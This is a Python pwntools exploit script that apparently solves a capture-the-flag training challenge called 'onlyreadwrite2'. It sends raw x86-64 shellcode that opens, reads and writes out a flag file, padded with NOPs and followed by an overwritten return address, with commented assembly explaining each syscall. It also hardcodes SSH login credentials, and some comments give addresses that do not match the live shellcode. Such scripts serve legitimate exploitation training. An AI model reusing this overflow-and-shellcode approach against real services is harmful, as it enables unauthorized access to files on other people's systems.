from pwn import *
import binascii
# context.terminal = [ 'tmux', 'splitw' , '-h']
# context.terminal = ['terminator', '--new-tab', '-x']
context.log_level = 'debug'
HOST = "training.jinblack.it"
PORT = 2006
PROG = "./onlyreadwrite2"
LOCAL_PORT = 4000
if args.REMOTE:
    r = remote(HOST, PORT)
elif args.GDB:
    r = process(PROG)
    gdb.attach(r,"""
    """)
    input("wait for gdb")
elif args.LOCAL:
    r = remote("localhost", LOCAL_PORT)
elif args.SSH:
    ssh = ssh("ubuntu","192.168.239.131", password="ubuntu")
    ssh.process(PROG)
else:
    r = process(PROG)

# input("Start connection.....")

r.recvuntil("What is your name?")
# shellcode = b"\x48\x31\xC0\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x02\x00\x00\x00\x48\xBB\x2E\x2F\x66\x6C\x61\x67\x00\x00\x53\x48\x89\xE7\x0F\x05\x48\x31\xFF\x48\x89\xC7\x48\xC7\xC6\xC0\x21\x60\x00\x48\xC7\xC2\x00\x01\x00\x00\x48\x31\xC0\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC6\xC0\x21\x60\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05"
shellcode = b"\x48\x31\xC0\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x02\x00\x00\x00\x48\xBB\x2E\x2F\x66\x6C\x61\x67\x00\x00\x53\x48\x89\xE7\x0F\x05\x48\x89\xC7\x48\xC7\xC6\xC0\x41\x60\x00\x48\xC7\xC2\x00\x01\x00\x00\x48\x31\xC0\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x04\x00\x00\x00\x48\xC7\xC6\xC0\x41\x60\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05"
# input("Send shellcode")
r.send(shellcode.ljust(1016,b"\x90") + p64(0x006020c0))
# input("Recv response")

r.recv(0x100)
r.interactive()

############## open -> read -> write
# xor rax, rax
# xor rdi, rdi
# xor rsi, rsi
# xor rdx, rdx
# mov rax, 0x2
# mov rbx, 0x000067616c662f2e
# push rbx
# mov rdi, rsp
# syscall
# open("./flag\x00\x00")

# read(5, 0x4041c0,0x100)
# xor rax, rax
# xor rdi, rdi
# mov rdi, 0x5
# mov rsi, 0x004041c0
# mov rdx, 0x100
# syscall

# write(4, 0x4041c0,0x100) on the socket file descriptor
# mov rax, 0x1
# mov rdi, 0x4
# mov rsi, 0x004041c0
# mov rdx, 0x100
# syscall



